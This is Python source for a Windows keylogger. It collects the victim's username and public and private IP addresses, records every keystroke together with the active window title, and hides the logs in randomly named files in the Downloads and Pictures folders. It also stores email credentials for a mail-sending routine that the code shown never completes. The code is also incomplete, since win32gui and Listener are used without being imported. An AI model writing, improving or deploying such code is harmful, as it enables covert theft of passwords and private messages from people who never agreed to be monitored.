import os
import time
import requests
import socket
import random
import smtplib
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import config

datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []

logging.basicConfig(filename=config.log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    global old_app
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    if new_app == 'Cortana':
        new_app = 'Windows Start Menu'
    else:
        pass

    if new_app != old_app and new_app != '':
        logged_data.append(f'[{datetime}] ~ {new_app}\n')
        old_app = new_app
    else:
        pass

    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',    'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
    'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
    '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
    '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]'
    ]

    key = str(key).strip('\'')
    if key in substitution:
        logged_data.append(substitution[substitution.index(key)+1])
    else:
        logged_data.append(key)
    logging.info(key)

def write_file(count):
    one = os.path.expanduser('~') + '/Downloads/'
    two = os.path.expanduser('~') + '/Pictures/'
    list = [one,two]

    filepath = random.choice(list)
    filename = str(count) + 'I' + str(random.randint(1000000,9999999)) + '.txt'
    file = filepath + filename
    delete_file.append(file)

    with open(file,'w') as fp:
        fp.write(''.join(logged_data))
    print('written all good')


def send_logs():
    count = 0

    fromAddr = config.fromAddr
    fromPswd = config.fromPswd
    toAddr = fromAddr

    MIN = 10
    SECONDS = 60

    while True:
        if len(logged_data) > 1:
            try:
                write_file(count)
                count += 1
            except Exception as e:
                print(f'[ERROR] {e}')
                pass
        time.sleep(MIN*SECONDS)

def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
